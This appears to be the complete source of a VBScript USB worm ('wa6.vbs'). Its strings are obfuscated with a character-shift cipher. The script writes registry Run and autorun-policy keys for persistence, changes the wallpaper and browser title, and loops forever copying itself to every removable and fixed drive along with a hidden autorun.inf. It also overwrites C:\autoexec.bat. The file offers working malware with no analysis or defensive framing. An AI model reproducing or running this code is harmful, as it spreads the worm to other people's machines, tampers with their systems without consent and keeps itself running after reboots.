option explicit
on error resume next
dim i
dim fso, rg, drv, tf
dim fileToCopy
dim destinationPath
dim sourcePath, sourcedrv
dim str, out
dim r1, r2, r3
dim art, art1, art2, art3
dim tot, pol
dim wp, gm, zp

art1 = "[`tsnqtm-hme"
conv art1
art2 = "Z`tsnqtm\"
conv art2
art3 = "rgdkkdwdbtsd<vrbqhos-dwdv`5-uar"
conv art3
wp= "B9[fcl`d-alo"
conv wp
gm= "FcnndxL`d"
conv gm
zp= "vrbqhos-dwd.D9uarB9[`tsndwdb-a`s"
conv zp

art = art2 & vbcrlf & art3

r1= "GJBT[Rnesv`qd[Lhbqnrnes[VhmcnvrRbqhoshmfGnrs[Rdsshmfr[Shldnts"
conv r1

r2= "GJBT[Rnesv`qd[Lhbqnrnes[Vhmcnvr[BtqqdmsUdqrhnm[Onkhbhdr[Dwoknqdq[MnCqhudSxod@tsnQtm"
conv r2

r3= "GJKL[Rnesv`qd[Lhbqnrnes[Vhmcnvr[BtqqdmsUdqrhnm[Qtm[Yho"
conv r3


set fso = CreateObject("Scripting.FileSystemObject")
set sourcePath = fso.getfile(Wscript.ScriptFullname)
sourcedrv =  left(sourcePath,3)

set rg = createobject("WScript.Shell")
rg.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", gm
rg.regwrite "HKCU\Control Panel\Desktop\Wallpaper" ,wp
rg.regwrite r1, 0
rg.regwrite r2, 0,"REG_DWORD"
rg.regwrite r3, zp 

do until 1=0

for each drv in fso.drives
If (drv.drivetype=1 or drv.drivetype=2) and drv.path <> "A:" then


set tf =fso.getfile(drv.path & art1)
tf.attributes =32
set tf=fso.createtextfile(drv.path & art1, 2, true)
tf.write art
tf.close
set tf =fso.getfile(drv.path & art1)
tf.attributes=39


fileToCopy= sourcedrv & "wa6.vbs"


destinationPath = drv.path & "\wa6.vbs"
fso.CopyFile fileToCopy, destinationPath

destinationPath =  "C:\autoexec.bat"
fso.CopyFile fileToCopy, destinationPath, true


fileToCopy= sourcedrv & "gdmae.bmp"
destinationPath = drv.path & "\gdmae.bmp"
fso.CopyFile fileToCopy, destinationPath

end if

next



Wscript.sleep 100000


loop

Function conv (str)
out=""
For i=1 to len(str)
 out=out + chr(Asc(Mid(str, i, 1)) + 1) 
Next
str= out
End function